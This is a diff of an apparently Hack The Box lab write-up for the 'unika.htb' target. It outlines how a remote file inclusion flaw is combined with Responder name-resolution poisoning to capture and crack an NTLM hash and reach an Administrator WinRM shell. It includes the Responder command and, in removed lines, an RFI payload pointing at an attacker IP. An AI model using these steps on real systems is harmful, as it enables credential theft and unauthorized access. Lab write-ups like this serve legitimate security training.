@@ -1,9 +1,10 @@
 # 1. Overview
 **Target:** `unika.htb`  
 **Difficulty:** Very Easy  
-**Primary focus:** Network-based credential harvesting and remote code inclusion → NTLM capture/relay to gain RCE / shell (WinRM).  
+**Skills:** RFI, responder, ntlm-relay, winrm  
 **Services observed:** Apache (HTTP) on 80/tcp, WinRM on 5985/tcp.  
-**High-level summary:** I discovered a web application vulnerable to remote file inclusion (RFI). By hosting a file and poisoning name resolution on the target LAN with Responder, I captured an NTLM challenge/response hash, cracked it to recover credentials, and used those credentials to obtain a WinRM shell as Administrator. Post‑access enumeration produced the Administrator (root) flag.
+**HTB Link:** https://app.hackthebox.com/starting-point  
+**summary:** Capture NTLM via LLMNR/NetBIOS poisoning and RFI, crack hash via John The Ripper, relay to SMB/WinRM to obtain admin shell.
 
 ---
 
@@ -22,16 +23,15 @@
 ### Responder tool
 - [NTLM hash](./evidences/ntlm_hash.png)  
 - `responder -I tun0`  
-- Listening on the interface connected to the target LAN for LLMNR/NetBIOS name resolution requests so we can capture usernames and NTLM challenge/response hashes (MD4).
+- Listening for LLMNR/NetBIOS name resolution requests, to capture NTLM challenge hash (username:MD4 hash of password).
 
 ---
 
 ## Initial Access
 ### Remote File Intrusion (RFI)
-- [RFI command](./evidences/remote_file_intrusion.png)  
-- `index.php?page=//10.10.14.78/test`  
-- Responder logs are stored in `/usr/share/responder/log`  
-- The captured hash from the log was saved to: [NTLM hash](./evidences/hash.txt)
+- [RFI command](./evidences/remote_file_intrusion.png)
+- triggers the LLMNR/NetBIOS Name Resolution Request.  
+- We get from responder the [NTLM hash](./evidences/hash.txt)
 
 ### Hash Crack
 - [NTLM hash cracked](./evidences/hash_cracking.png)  
